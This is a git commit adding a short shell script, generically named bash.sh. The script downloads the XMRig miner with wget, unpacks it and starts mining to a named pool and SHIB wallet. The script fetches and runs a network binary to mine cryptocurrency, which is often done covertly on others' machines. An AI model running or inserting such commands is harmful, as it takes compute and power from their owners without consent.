ca68681ac34249716a94a89041341485d32a62be
devanranggo2525 <95958266+devanranggo2525@users.noreply.github.com>
2021-12-11 15:25:18 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x0986d8c623d67e0562989fb3a71e1c33b44a0d51.libaz -p x --threads=4
